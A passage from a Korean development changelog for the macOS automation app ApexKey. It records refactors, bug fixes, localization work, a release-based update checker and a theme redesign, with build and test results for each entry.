- 문서 정정 — `docs/FUNCTIONAL_CHECKLIST.md` 전면 갱신(8개월 방치), `docs/TODO.md` 거짓 `[x]` 6건(T-036·T-132·T-135·L-09·R-04·U-17) 정정

## 2026-09-22 macos — 대형 파일 분할 + CI pipefail (PLAN_v0.20)

> 테스트 171/0·빌드·현지화 게이트 통과 후 기록. 이동만, 동작 불변.

- **E-MAC-CI-9201** — GitHub Actions 기본 `bash -e`가 `xcodebuild | tail` 파이프 실패 종료코드 삼킴 → `ci.yml`/`release.yml` 모든 `run: |` 블록 `set -euo pipefail`
- **E-MAC-SYS-8005** — `androidMirrorScriptPath` 하드코된 `/Users/lee/...` 절대경로 → 개발 머신 절대경우 우선, 없으면 Application Support 시드 (번들 `Resources/scrcpy_run.sh` → `#file` 소스 → 최소 대체). CI 단위테스트 `testVerifyAndroidMirrorScriptFileExists`/`testBuiltInPresetsAreFixedWithoutHotkeys` 회귀
- **분할** — `CustomTheme.swift` 1600줄 → `Models/Theme/` 8파일 (Metadata 86 · Colors 241 · Background 90 · Glass 133 · StyleTokens 220 · CustomTheme 97 · Presets 718 · Color+ThemeHex 94). public 타입 유지
- **분할** — `AppDelegate.swift` 950줄 → 본체 183 + extension 6파일 (+StatusItem/+Menus/+Windows/+URLScheme/+PaletteHUD) + `AppDelegate+Windowing` (KeyCapablePanel/ToastPanel). cross-file 접근용 멤버 `private` 제거, stored property·라이프사이클 본체 유지

## 2026-09-22 macos — UI 고정프레임·다중모니터·undo (PLAN_v0.19)

> 테스트 171/0·빌드·현지화 게이트 통과 후 기록.

- **E-MAC-UI-9101** — `NSScreen.main` 5곳 다중모니터 오배치 → `AppDelegate.screen(for:)` 유틸 (창 소속 → 마우스 → main → screens.first)
- **E-MAC-UI-9102** — Toast 340 고정폭 한글 넘침 → minWidth 340 / maxWidth 440 + `fixedSize`
- **E-MAC-UI-9103** — StepSettings 시트 480×680 고정 → min 480 + ideal 480×680
- **E-MAC-UI-9104** — HotKeyRecorder 300×80 고정 잘림 → min/ideal 크기
- **E-MAC-UI-9105** — HUD 4열 고정 소형 화면 열 증발 → `preferredColumnCount` 화면 폭 기반(2/3/4) 동적 분할
- **E-MAC-UI-9106** — `© 2026` 하드코딩 → `Calendar.current` 연도
- **E-MAC-UI-9107** — `esc` 비로컬라이즈 → `palette.esc_key` 키 추가 (ko/en 801키 동기화)
- **E-MAC-UI-9108** — Edit 메뉴 undo/redo 셀렉터 미구현 → `@objc undo/redo` keyWindow.undoManager 위임 연결

## 2026-09-22 macos — UI/UX P1 수정 (PLAN_v0.18)

> 테스트·빌드 게이트 통과 후 기록.

- **E-MAC-UX-9001** — `alwaysOnTop` init가 매 실행 강제 리셋 → 저장값 복원
- **E-MAC-UX-9002** — 한글·비ASCII 변수명 regex 미매칭 → `\{([^{}:]+)\}` 3곳 통일 (VariableResolver/UseModelExecutor/AIModels)
- **E-MAC-UX-9003** — Stop Shortcut 출력 변수 미반영 → `actionParameters`에서 `StopShortcutAction` decode 후 `outputVariable` 기록 + 편집기 encode 경로
- **E-MAC-UX-9004** — osascript stderr 원인 불분류 → -1743 권한거부 / -600 앱미실행 / 그 외 메뉴없음 분류
- **E-MAC-UX-9005** — `"Apple"`/`"서비스"` 하드코딩 2곳 → `MenuEnumerator.excludedMenuBarTitles` 상수 집합
- **E-MAC-MENU-7006** — 메뉴바 조회 실패 info → error(warn) 승격
- **E-MAC-UX-9007** — GitHub 403/429 → `rateLimited` 케이스 + `isNewerStrict` SemVer 프리릴리스 비교 (`isNewer` 행위 불변)
- **E-MAC-UX-9008** — `ConfigStore.appLanguage`가 직접 `AppleLanguages` 쓰기 → `LanguageManager.setLanguage` 단일 출처
- **E-MAC-UX-9009** — ThemeManager 하드코드 pref 키 8곳 → `ConfigStore.PrefKeys` 상수 (rawValue 동일, 마이그레이션 불필요)

## 2026-09-22 macos — 자동화·핫키 P0/P1 (PLAN_v0.17)

> 테스트·빌드 게이트 통과 후 기록.

- **P0-4** — `activeTimers`가 `"H:M"`만 저장해 다음 날 같은 시각 발동 차단 → 날짜 포함 키 + unregister 정리 + `.none` UserDefaults 1회 영속
- **P0-5** — ⌘⇧↩ Carbon 핫키와 `pauseUntilInput` 로컬 모니터가 서로 못 받음 → `resumePauseUntilInput` 병행 해제, 대기 중에는 반복 실행 안 함 (`E-MAC-AUTO-6001`과 무관)
- **RepeatRule** — weekly/monthly/custom 전부 true → 기준 요일·날짜 필드 + `TimeOfDayTrigger.shouldRun` + 설정 UI
- **미구현 트리거** — 8종 + file 등록 거부 (`E-MAC-AUTO-6001`) + UI "준비 중" 비활성
- **폴더** — `ignorePatterns` glob 스킵, FSEvent 복합 flags 전 타입 교집합 발동
- **핫키** — 프로브 일회성 signature, `beginTest` 선행 `endTest`, 죽은 `forEach { _ in }` 제거

## 2026-09-22 macos — 저장소 P0 데이터 소실 방어 (PLAN_v0.16)

> 테스트·빌드 게이트 통과 후 기록.

- **P0-3** — 디코딩 실패 blob이 `syncShortcut`으로 빈 배열 영구 덮어쓰기 → `encodeKeeping`(실패 시 기존 Data 유지) + 컬럼 단위 쓰기 가드 (`E-MAC-STORE-5003`)
- **P0-1** — 구 `Application Support/default.store` → 전용 디렉터리 1회 이관 (store·`-wal`·`-shm`, `E-MAC-STORE-5005`)
- **P0-2** — `ModelContainer` 생성 실패 시 손상 store 격리(`.corrupt-{stamp}`) 후 재시도 + `storeRecoveryBackupPath` 게시 (`E-MAC-STORE-5006`)

## 2026-09-22 macos — 대형 파일 분할 2 (PLAN_v0.15)

> 테스트 151건 0실패(2 skip) · 빌드 성공. 이동만, 동작 불변.

- **분할** — `Theme.swift` 888줄 → `Models/Theme/` 4파일 (프로토콜+내장테마 510·매니저 284·외관모드 10·SwiftUI브릿지 95). public·타입명 유지

## 2026-09-22 macos — 대형 파일 분할 1 (PLAN_v0.14)

> 테스트 151건 0실패(2 skip) · 빌드 성공. 이동만, 동작 불변.

- **분할** — `StepSettingsView.swift` 1150줄 → `Views/StepSettings/` 6파일 (메인 126·테스트 210·앱실행 220·조건 359·AI 119·기타 126). `sectionCard`만 private→internal

## 2026-09-22 macos — 코덱·PATH 단일화 (PLAN_v0.13)

> 테스트 151건 0실패(2 skip) · 빌드 성공. `json:` 포맷 불변.

- **코덱** — `LaunchConfigCodec` 신설(`prefix`+decode/encode 단일 출처), `ActionExecutor` 코덱은 thin wrapper로 위임 (테스트 참조 유지)
- **PATH** — `ShellEnvironment.fallbackSystemPaths` 상수 신설, export문·env 폴백 공유

## 2026-09-22 macos — UI 저장·실행통합 (PLAN_v0.12)

> 테스트 151건 0실패(2 skip) · 빌드 성공.

- **저장 유실** — 편집기 빨간X·Cmd+W로 닫아도 이름/설명/단계 저장 (`onDisappear` 추가)
- **저장 유실** — SystemScriptEditor 미저장 스크립트 닫힘 시 자동 저장 (침묵 소실 방지)
- **중복 제거** — `execute(binding)` 80줄 분기를 `executeWithDetail` 위임으로 통합 (반환 동등, 실패 1줄 로그)

## 2026-09-22 macos — P1 엔진·핫키 정합화 (PLAN_v0.11)

> 테스트 151건 0실패(2 skip) · 빌드 성공.

- **반복 탈출** — `execute(steps:)`가 breakLoop를 삼켜 Break 후에도 반복이 끝까지 실행 + 성공 둔갑 → `ok` 누적·`.breakLoop` 상위 전파로 수정
- **재귀 가드** — RunShortcut depth `> 10` → `>=` (실제 11단계 허용 off-by-one)
- **변수 출력** — repeatIndexVariable nil이면 매번 랜덤 UUID에 기록 → 지정된 때만 기록
- **핫키** — `registerAllBindings` 실패 집계 로그 (`E-MAC-HTKEY-1001`, 재설정 안내)

## 2026-09-22 macos — P0 크리티컬 5건 수정 (PLAN_v0.10)

> 테스트 151건 0실패(2 skip) · 빌드 성공 · 현지화 가드 통과.
> F-05 전체 비동기화는 @MainActor·동기 API 변경이 필요해 경고 로그 + 후속 과제로 분리.

- **교착** — `AutomationManager.unregister`가 락 보유 채 `rebuildWatchers` 호출 → 락 해제 후 재구축으로 수정
- **크래시** — 반복 count 0·음수 시 `1...count` 트랩 → `E-MAC-FLOW-7008` + 실패 반환 가드
- **크래시** — AppDetail URL Scheme `!` 강제 언랩 2곳 → `guard` + `E-MAC-APP-4003` 처리
- **현지화** — `ui.app_detail.select_system` 중복 정의 제거 (ko/en 796종 확정, 시스템 프리셋 문구 유지)
- **블로킹** — `performAction` 메인 스레드 경고 로그 추가 (runWait `E-MAC-ACT-3006` 패턴과 동일)

## 2026-09-22 macos — GitHub Releases 기반 업데이트 확인 (PLAN_v0.9)

> 유료 Developer 계정 없이 쓰는 릴리스 페이지 이동 방식 (macos-app-update 가이드 이식).
> 인앱 자동 설치 없음 · DMG 단일 산출물 · 기본 주기 weekly.
> 테스트 151건 0실패(2 skip) · 빌드 성공 · 현지화 가드 통과 · 실기 재실행 검증.

- **조회** — `ReleaseChecker` 신규 (`releases/latest` + `body` 디코딩, 404=릴리스 0개 별도 구분, User-Agent 번들 버전)
- **상태** — `ConfigStore+Update` (`UpdateState` 5종 + 주기 4종 기본 weekly + `updateCheckedAt` UserDefaults 영속, 수동 확인 시 자동 팝업용 Bool 반환)
- **UI** — `ReleaseNotesView`(줄 단위 블록 + 인라인만 해석, View `.font()` 금지) + `UpdateAvailableSheet`(버전·노트·DMG 안내·다운로드=릴리스 페이지 이동, `onClose` 공용)
- **진입점 3곳** — 설정 섹션(상태+주기+확인+시트) · 정보 창(확인 버튼+상태) · 메뉴바 우클릭(확인 항목+AppDelegate 공용 윈도우), 실행·패널열기 자동확인(조용히)
- **현지화** — 신규 키 19건 (`update.*` 18 · `menu.check_update`), ko/en 각 778→797키
- **릴리스 파이프라인** — 태그 `v*.*.*` 조이기 + 태그-번들 일치 검증 + ZIP 제거(DMG 단일) + `release-notes/<tag>.md` 지원
- **테스트** — `ReleaseCheckerTests` 12건 (버전 비교·디코딩·주기 기본값)
- **주의** — 다음 릴리스부터 태그-번들 검증 강제. 현재 번들 1.0 vs 최신 태그 v1.2.0이므로 다음 릴리스 전 Info.plist 범프 필요

## 2026-09-22 macos — 시스템 탭 → 프리셋 통합 + 워크플로우/자동화 (PLAN_v0.8)

> 시스템 동작 9종이 결국 1단계 워크플로우의 고정판임을 정리. 탭을 제거하고 프리셋으로 통합.
> 테스트 139건 0실패(2 skip) · 빌드 성공 · 현지화 가드 통과.

- **명칭** — "동작"→"워크플로우" (탭/빈 상태/삭제 알림/편집 메뉴/푸터 카운트/녹화 알림/팔레트 검색·섹션·명령, ko/en)
- **시스템 탭 제거** — `SystemActionsView.swift` 삭제, SidebarView/`ToolSelection`에서 `.system` 제거. 기존 `.system` 바인딩은 시작 시 전부 해제, `systemBindings`/`setSystemBinding` API 제거
- **프리셋 통합** — 스테이션 "프리셋 추가" 시트에서 시스템 9종 체크박스 선택 → 1단계 워크플로우 생성(`addPresetShortcuts`, 동명 중복 방지, 시스템 아이콘). 설치 시 샘플 3개(`seedSampleShortcuts`) 제거로 빈 상태 시작
- **스크립트 편집 이관** — `SystemScriptEditorView` 공개 분리 + 단계 설정 `.system` 케이스에 임베드 (보기/테스트/결과창/저장·되돌리기)
- **자동화 탭 신규** — `ToolSelection.automation` + SidebarView 행(트리거 수 배지) + `AutomationBrowserView`(워크플로우별 트리거 카드, 새 자동화 시 워크플로우 선택 후 `AutomationSettingsView` 편집)
- **현지화** — 신규 키 14건 (`ui.automation.title/subtitle/new/edit/choose_workflow/trigger_count/no_workflows/no_automations` · `ui.station.preset_add/title/intro/selected/confirm` · `ui.app_detail.select_system` 변경), ko/en 810→824줄

## 2026-09-21 macos — 전체 리팩토링 + 버그·동작 연결 점검 (PLAN_v0.7)

> 2방향 감사(구조+연결) 기반 저위험 수정. 빌드 성공 · 단위 테스트 139건 0실패(2 skip).

- **1차 리팩토링 (G)** — G-01 `print`→`Logger.error(E-MAC-STORE-5001)` · G-02 `runScriptFileResult` PATH를 `ShellEnvironment.extraPaths` 단일 출처로 · G-03 `decode/encodeLaunchConfig` 실패 로그(E-MAC-APP-4003)
- **2차 버그수정 (B)** — B-01 AI 3종 Bool 반영(성공 둔갑 해소) · B-02 RunShortcut 7006/7007 실패 반환 + 재귀 depth 10 가드(E-MAC-FLOW-7009) · B-03 `execute` url/file 빈값·미존재 false (`executeWithDetail`와 일치, `toast.reason.file_missing` ko/en 추가) · B-04 If/Repeat/Choose 설정없음 실패 반환(취소는 성공 유지) · B-05 `removeShortcut` 자동화 unregister(고스트 제거) · B-06 편집기 `duplicateStep` 새 UUID · B-07 `executeBinding` 결과 토스트 + lastID 갱신 · B-08 예약 핫키 3종 UserDefaults 영속화 + `isDuplicate` 예약 포함 + `set*` 중복 거부(E-MAC-HTKEY-1002) · B-09 편집기 `executeShortcut` 변수/권한 포함
- **테스트** — `ApexKeyRefactorTests` 8건 신규 (Shell 단일출처/Combo 매칭/RunShortcut 실패·깊이/If 실패/LaunchConfig 왕복/URL·파일 실패)
- **백로그 잔류** — StepSettings 1143줄·CustomTheme 1600줄 분할, `menuPath` 편집 UI, P1 38종 미구현, B12, blob 손상 가드

## 2026-09-18 macos — 동작 단계 스크립트 보기·테스트 실행 복구

> 동작(단축어) 편집기에서 스크립트 단계 클릭 시 설정창이 뜨지 않아 등록된 명령을 볼 수 없던 문제 수정 + 스크립트 테스트 실행 UI 추가.

- **수정** — `ShortcutEditorView.selectStep`: 설정이 있는 타입만 열던 필터 제거, 모든 단계 타입에서 설정창 표시. `steps` 변경 시 자동 저장(`onChange` → `saveSteps`)
- **설정창** — `StepSettingsView.DefaultSettingsView`: 스크립트 계열(`script`·`appleScript`·`JXA`·`runScriptInShell`)은 제목 + 멀티라인 셸 명령 편집기 + "테스트 실행" 버튼 + 터미널 출력창(종료 코드·stdout/stderr), 기존 `runShellScriptResult` 재사용(백그라운드 실행)
- **현지화** — 신규 키 5건 (`ui.step_settings.test_run`·`test_output`·`running`·`no_output`·`exit_code`), ko/en 각 692→697키
- **검증** — 빌드 성공 · 현지화 가드 통과 · 단위 테스트 69/70 통과(기존 실패 1건 `testRegisteredAppURLResolvedByBundleID` 무관)

## 2026-09-16 macos/web — 메인 화면 스크린샷 추가 (EN·KO)

> `website/img/main_en.png`(EN 패널) · `website/img/main_kr.png`(KO 패널) 추가.

- **README** — `README.md` 배지 하단에 영문 스크린샷(800px 폭) 삽입, `README.ko.md`에 한글 스크린샷 삽입
- **랜딩 페이지** — `website/index.html`·`ko/index.html` hero 섹션과 마퀴 사이에 `section.app-preview` 삽입 (720px 폭, 둥근 모서리 + 그림자 + lazy loading)
- **CSS** — `styles.css`에 `.app-preview` 규칙 추가

## 2026-09-16 macos — 잔여 문자열 다국어화 2계층 (PLAN_v0.6_l10n)

> 모델 displayName/displayString/summary + 사용자 노출 에러를 Localizable.strings로 치환.
> ko/en 각 550→672키(+122, osascript 키 1건은 로그 전용으로 판명되어 제외). 테스트 70개 중 69 통과
> (1건 실패는 기존 환경 관련 `testRegisteredAppURLResolvedByBundleID`와 무관) · 빌드 성공.

- **신규 키 스키마** — `variable.*`(32: type 3 · special 10+desc 10 · value 9) · `condition.op.*`(13) · `flow.*`(16) · `category.app.*`(9) · `system.action.*`(8) · `color.name.*`(13) · `step.*`(11) · `error.user.*`(4) · `appearance.*`(9) · `macro.title_fmt` · `ui.binding.duplicate_fmt` · `ui.condition.value` · `ui.sidebar.expand/collapse` · `ui.window.settings/about/debug_log`
- **모델 로컬라이즈** — `VariableModels`(VariableType·SpecialVariable 표시/설명·VariableValueType·ActionOutput.preview), `FlowControlModels`(ConditionOperator·ConditionOperand 상수 표시·IfBranch·RepeatMode·RepeatLoop·ChooseFromMenu), `AppItem`(AppCategory 9종), `Shortcut`(summary 30케이스 정리, runCountFormatted/lastRunFormatted), `ShortcutColor`(13색), `SystemActionType`(8종)
- **사용자 노출 에러** — `error.user.action_failed_fmt`(ExecutionEngine) · `script_failed`(EE) · `empty_script`(ActionExecutor) · `foundation_models_unavailable`(AIAvailabilityManager) · `ui.cancel` 재사용(EE 알림)
- **서비스/설정/뷰** — ConfigStore+Preferences(menu_hud.style 재사용)·+Macro(매크로 N키)·+Bindings(복제 접미사), ThemeSettingsView(외형/프리셋/텍스트크기/AppearanceMode), StepSettingsView(값 플레이스홀더), SidebarNavigation(사이드바 help/검색), AppDelegate(설정·정보·디버그 로그 창 타이틀)
- **테스트** — `testAppCategoryDisplayName`·`testShortcutStepSummary`를 키 기반 비교로 재작성(언어 무관)
- **보류(계획에 따라)** — 로그 문자열, `{마법변수/변수/마법}` 토큰, 불리언 입력 파싱(참/예/거짓), 시드 데이터(프리셋/예시 단축어), 레거시 마이그레이션 키

## 2026-09-16 macos — 잔여 문자열 다국어화 3계층 + 현지화 가드 (PLAN_v0.6_l10n)

> 2계층에서 미반영된 서비스 출력·LLM 프롬프트·오류 상태 텍스트 + 재발 방지 가드 추가.
> ko/en 각 672→692키(+20). 코드 참조 키 전수 검증 통과(모두 strings 내 존재). 단위 테스트 69/70 통과(기존 실패 1건 무관). 보안 스캔 통과. 빌드 성공(PID 70319).

- **서비스 출력 로컬라이즈** — WritingToolExecutor: `[교정 결과]/[다시쓰기]` 결과 포맷(2), 톤 접미어 `[전문적]..` 등(6) → `ai.writing.result_*_fmt`·`ai.tone.code_*` / ImagePlaygroundExecutor: 플레이스홀더 `"이미지 생성"`, 배지 `"ImagePlayground - %@"`(2) → `ai.image.placeholder_fmt`·`ai.image.badge_fmt` / VariableResolver: 불리언 `"참"/"거짓"`, 이미지 `"[이미지]"`(3) → `variable.boolean_true/false`·`variable.image`
- **메뉴 실행 상태** — MenuEnumerator `MenuActionResult.description`(성공/앱 미실행/권한 없음/메뉴 미발견) → `menu.action.status_*` (4)
- **LLM 프롬프트** — UseModelExecutor FollowUp 대화 헤더 `"이전 대화:"`, 역할 `"사용자"/"AI"` → `ai.prompt.conversation_header`·`role_user/ai` (3)
- **현지화 가드** — `scripts/check-localizable.py`: 앱 타깃(Sources/ApexKey)에서 `//` 주석·`/* */` 블록 주석·`Logger.`·`.localized`·토큰·불리언 파싱·`"서비스"`·StoreCoding 라벨·카테고리 매칭·시드/레거시 데이터를 제외하고 한글 문자열 리터럴을 전수 검사, 미반영 0건 달성. `build_and_run.sh` 가드(0/5a)로 연결 — 잔여 한글이 0건 미만이면 빌드 실패
- **보류** — 동일 (로그 문자열·토큰·파싱·시드·레거시)

## 2026-09-16 web — README·랜딩 페이지 리디자인 (영어 메인, Command Key 심볼릭)

> 정적 문서/웹 작업. 빌드·테스트 불필요, HTML 구조 검증 통과.

- **README 언어 전환** — `README.md` 영어 메인, `README.ko.md` 한국어 신설, `README.en.md` 제거. 양방향 링크 + 랜딩 페이지 주소 갱신
- **랜딩 페이지 리디자인 (Command Key Symbolic)** — 미니멀 다크 · 틸→퍼플 그라디언트 + 골드 ⌘ 키캡 CSS 아트 · 핫키 시퀀스 모티프 · 키캡 마퀴 애니메이션 · 키보드 스텝 / 6개 기능 카드 / 8개 테마 스트립 · 152개 액션 마이크로카피
- **EN/KO 바이링궐** — `website/index.html`(EN 메인, `/ApexKey/`) + `website/ko/index.html`(KO, `/ApexKey/ko/`). 공용 `styles.css`·`script.js`(언어 감지 릴리즈 라벨) 유지, nav에 언어 토글 추가. `pages.yml` 변경 없이 작동

## 2026-09-16 macos — 중복 제거 리팩터 R2 (이벤트 타입 + 메뉴 팩토리)

> 동작 보존. BUILD SUCCEEDED · unit 70건 중 69 통과(기존 1건 MovistPro 환경 실패 무관).

- **R2-1 이벤트 요약 공통화** — `TriggerEventDisplayable` 프로토콜 + `Sequence.displaySummary` 확장 신설, 9개 `*EventType` 채택. `eventTypes.map(\.displayName).joined(separator: ", ")` 9곳 중복 해소
- **R2-2 StageManagerEventType 통합** — `FocusEventType`과 정의 완전 동일(켜짐/꺼짐, rawValue 동일)이라 `typealias`로 통합, 중복 enum 정의 12줄 삭제. Codable 저장 호환 유지
- **R2-3 메뉴 항목 팩토리** — `AppDelegate.makeItem(title:action:key:target:)` 신설, 메인 메뉴 3곳 + 상태 메뉴 5곳의 NSMenuItem 생성·target 지정 보일러플레이트 해소. 편집 메뉴(responder chain, target nil)는 기존 동작 유지 — 메뉴 테스트 통과 확인

## 2026-09-16 macos — 깊은 리팩터 R1 (PLAN_v0.4_refactor, R-01~11)

> 동작 보존 + 버그 수정. 제품 결정(127개 액션 실행 구현 등)은 백로그.
> BUILD SUCCEEDED · unit 70건 중 69 통과(기존 1건 MovistPro 환경 의존 실패 무관) · 재설치/재실행 후 저장소 무손실 확인.

- **R-01 엔진 실패 전파** — 미구현 액션이 성공으로 둔갑하던 silent 실패 해소. `default` 분기가 변수 토큰 치환 후 실행하고 실패를 `Result(success:false)`로 반환, 단계 루프가 전체 성공도를 추적. 실행 통계·자동화도 실패 시 미증가로 일관
- **R-02/R-03 대기·입력대기** — `wait`가 호출 스레드에서 동기 sleep(순서 보장), 메인 스레드 호출 시 `E-MAC-ACT-3006` 경고. `pauseUntilInput`은 메인 호출 시 교착 대신 백그라운드 전환
- **R-04 메뉴바 타입 확인** — `as!` 강제 캐스트를 타입ID 비교 + `unsafeDowncast`로 교체, 불일치 시 `E-MAC-MENU-3004`
- **R-05 저장 묵살 해소** — `saveContext`/`fetchContext`/`StoreCoding` 헬퍼로 `try?` 30여 곳을 에러 로그를 남기도록 전환 (`E-MAC-STORE-5001` 저장/`5002` 인코딩/`5003` 디코딩/`5004` 조회)
- **R-06 죽은 코드 삭제** — `runScript` 래퍼, `debugInfo`, `toModelContext`(손실 변환), `value(forName:)` 제거. `executeFollowUp`은 Follow-Up 토글 UI용이라 유지(연결은 백로그)
- **R-07 PATH 단일화** — `ShellEnvironment` 신설, 앱·테스트가 공유 (adb 탐색 경로 드리프트 방지)
- **R-08 카테고리 정합** — 변수 5종 `.variables` 귀속(중복 등록 해소), `automationRun`/`trigger`를 automation 목록에 추가. 변수 단계 색상이 cyan으로 통일
- **R-09 메타데이터 테이블화** — `ActionMetadata.swift`에 152항목 단일 출처, displayName/systemImage/category 3스위치 삭제. `drive`/`oneDrive` 표시명 중복은 값 유지(판단 보류, 백로그)
- **R-10 ConfigStore 분할** — 1037줄 → 본체 314줄 + 영역별 extension 9파일 (HotKeyDefaults/Preferences/Automation/Apps/Scripts/Shortcuts/Bindings/HotKeys/Macro). public API 동결, 편집기 확장도 Shortcuts 파일로 이관
- **R-11 표시 수정** — 반복 횟수 미설정 시 "0회"→"반복" (실행 폴백 1회와 일치)

## 2026-09-16 macos — 다국어 지원 (i18n, T-140~142)

> 언어: 한국어/영어/시스템 자동 · 반영: 앱 재시작(표준 AppleLanguages 키)
> BUILD SUCCEEDED · unit 70건 중 69 통과(기존 1건 MovistPro 환경 실패 무관)

- **T-140 인프라** — `Localizable.strings`(ko/en 38항목) 생성, `LanguageManager` 싱글턴(`setLanguage`/`currentLanguageCode`/`needsRestart`), `ConfigStore.appLanguage` 영속화(`AppleLanguages` + `pref.appLanguage` 이중 저장)
- **T-141 설정 UI** — `SettingsView`에 "언어" 섹션 추가: Picker(시스템/한국어/영어) + 변경 시 즉시 재시작 필요 배너(주황) 표시, `LanguageManager.needsRestart` 활용
- **T-142 전체 치환** — 하드코딩 문자열 65개 키 추출·ko/en 번역 등록, `Text(\"...\")` → `Text(LocalizedStringKey(\"key\"))` 전수 치환(18개 파일), `ActionMetadata.displayNameKey`로 액션 카탈로그 지역화(`action.launchApp` 등 152개)
- **테스트** — 신규 `ApexKeyMetadataTests` 메타데이터 정합성 4건 통과, 전체 69/70 통과(기존 1건 MovistPro 환경 실패 무관)
- **테스트** — 신규 7건: 메타데이터 전수 정합 4건 + 엔진 실패 전파 + wait 순서 보장 (기존 스크립트·메뉴 8건 포함 전체 통과)

## 2026-09-16 macos — 스크립트 동작 쉽게 만들기 (T-130~132)

- **셸 실행 강화** — `ActionExecutor.runShellScript` 신설: GUI 앱 최소 PATH에 Homebrew(`/opt/homebrew/bin`)·Android SDK `platform-tools` 자동 포함, 출력/종료코드 로그, 성공 여부 반환. 기존 `runScript`는 fire-and-forget이라 adb를 못 찾고 실패 원인도 안 남았음. `.runScriptInShell`이 미구현(`E-MAC-ACT-3005`)이던 것을 동일 경로로 실행. `ExecutionEngine`에 `.script`/`.runScriptInShell` 명시 분기 추가(실행 전 `{변수}` 토큰 치환, 출력을 단계 출력으로 저장)
- **스크립트 전용 설정 UI** — `ScriptSettingsView`(제목 + 여러 줄 monospace 명령 편집 + 테스트 실행 버튼, 결과는 디버그 로그에서 확인). `ShortcutEditorView.selectStep`이 스크립트 단계도 설정 창을 열도록 연결 — 기존엔 스크립트 단계를 눌러도 아무 창이 안 열려 명령을 넣을 방법이 없었음. `createDefaultStep`에 `.runScriptInShell` 기본값 추가
- **ADB Wi-Fi 연결 샘플** — `ConfigStore.ensureADBWifiSample`이 이름 기준 없으면 1회 생성(기존 사용자 포함). 스크립트: `adb tcpip 5555` → `ip route`에서 IP 추출 → `adb connect IP:5555`. 실기 검증: USB 연결 기기에서 `already connected to 10.36.188.13:5555` 성공
- **검증** — BUILD SUCCEEDED · unit 63건 중 62 통과(기존 1건 MovistPro 환경 의존 실패 무관) · 재설치/재실행 후 저장소에서 샘플 생성 확인 · `ApexKeyScriptTests.testAdbWifiShortcutEndToEnd`가 앱 실행 경로 그대로 실기 성공
- **T-133 테스트 결과 표시** — `runShellScript`를 `runShellScriptResult`(성공/출력/에러/종료코드 반환)로 분리, 스크립트 설정의 테스트 실행이 성공·실패 배지와 결과 텍스트를 창에 바로 표시
- **T-134 Cmd+C/V 미동작 수정** — 원인: `setupSystemMenu`가 앱 메뉴만 구성해 편집 표준 액션이 first responder에 전달되지 않음. `makeMainMenu`에 편집 메뉴(실행 취소 ⌘Z/다시 실행 ⇧⌘Z/잘라내기 ⌘X/복사 ⌘C/붙여넣기 ⌘V/지우기/모두 선택 ⌘A, target nil → responder chain) 추가 + `ApexKeyMenuTests` 회귀 테스트
- **T-135 동작 고정 프리셋** — 시스템 탭과 동급: `BuiltInShortcutPresets`에 Android Untether(언테더)/Mirror(미러) 2개 고정, 단축키 없이 제공(사용자 지정), 삭제 가능·삭제 시 재생성 안 함. `ensureBuiltInShortcuts`가 설치·업데이트 후 이름 기준 보충. 재설치·재실행 후 저장소 확인: 2개 존재·구명 중복 없음. 미러 scrcpy 옵션(`--show-touches --stay-awake --legacy-paste --max-size=1024 --video-bit-rate=2M --max-fps=30`) 반영 + 저장된 복사본에도 동일 내용 적용
- **T-136 편집기 저장 유실 수정** — 원인: 빨간 X(윈도우 닫기)는 `saveAndClose`를 안 타서 단계 수정이 날아감. `.onDisappear`에 단계/이름/설명/자동화/변수 저장 추가. `build_and_run.sh debug`가 기존 앱 종료+재시작(5/5)까지 수행

## 2026-09-04 macos — osaurus 기반 전면 테마 리디자인 (Phases 1~7)

> **목표**: 기존 하드코딩 시스템 색상을 버리고 osaurus 프로젝트의 테마 기반 디자인 시스템을 ApexKey 전 창(메인/설정/About/HUD/런처/편집기)에 이식.
> BUILD SUCCEEDED · `./build_and_run.sh test macos unit` 통과(55건 중 0 신규 실패, 기존 1건은 MovistPro 환경 의존 실패 무관).

- **Phase 1 — 테마 시스템 이식** — `Models/Theme/`에 `Theme.swift`(ThemeProtocol + LightTheme/DarkTheme + CustomizableTheme + ThemeManager 싱글턴 + `\.theme` 환경키), `CustomTheme.swift`(색상/글래스/타이포/애니메이션/섀도우/배경/메시지/보더 모델 + Dark/Light/Neon/Nord/Paper/Terminal/Osaurus Dark·Light 내장 프리셋 8종 + `Color(themeHex:)` 캐시), `SystemAccentColor.swift`(시스템 액센트 추출 + `followsSystemAccent` 재도출), `ThemeConfigurationStore.swift`(App Support 테마 영속화 + schema 6 내장 설치). `ThemeManager.shared`가 시스템/라이트/다크 전환·커스텀 테마·fontScale(0.5~2.0) 담당.
- **Phase 2 — 공용 프리미티브** — `Views/Common/`에 `SettingsSection`/`SettingsField`/`SettingsSubsection`/`StyledSettingsTextField`/`SettingsToggle`/`SettingsDivider`/`SettingsButtonStyle`(카드+대문자 헤더), `SidebarNavigation`(System Settings 스타일 240/64pt 확장·접기 + 검색 + collapsible 섹션 + 호버/선택), `ThemedBackgroundLayer`(solid/gradient/image), `ThemedRoot`(창 루트 테마 주입 + 기본 색상 스킴), `ThemedBackgroundModifier`/`ThemedCardModifier`.
- **Phase 3 — 메인 창** — `AppDelegate`의 모든 NSHostingController 루트를 `ThemedRoot { }`로 감싸 전 창 테마 주입(패널/설정/About/디버그/편집기/단계/런처/HUD 2종). `MainWindowView.SearchField`·`SidebarView`·`AppsContentView`·`AppRowView`를 테마 토큰(primaryText/secondaryText/cardBackground/border)으로 전환.
- **Phase 4 — 편집기/스테이션** — `ShortcutStationView`·`ShortcutEditorView`·`StepSettingsView`·`ActionCatalogView`·`VariablePanelView` 하드코딩 색상을 theme 토큰으로 교체 + `primaryBackground`/`cardBackground` 배경.
- **Phase 5 — HUD/런처** — `QuickLauncherView`(`Color(.windowBackgroundColor)`→`theme.primaryBackground`), `MenuHUDOverlayView`·`MenuCheatSheetView`(어둡기 고정 → 테마 카드/보더 + 글래스 유지), 색상·키캡 상태색(성공/경고/에러) theme 토큰화.
- **Phase 6 — 설정/About + 테마 탭** — `SettingsView`·`SystemActionsView`·`AboutView` 테마 적용 + 신규 `ThemeSettingsView`(외형 모드 시그먼트 + 내장 프리셋 칩 + 폰트 스케일)를 SettingsView "테마" 섹션에 통합.
- **검증** — 신규 테마 코드+UI 변경 모두 컴파일(전체 빌드 SUCCEEDED), 단위 테스트 55건 중 0 신규 실패(기존 환경 의존 1건만). 기능 로직(상태/바인딩/시트/핸들러)은 전부 보존.

## 2026-09-04 macos — 테마 보강 + 앱 상세·동작 UI 버그수정 (A·B·C)

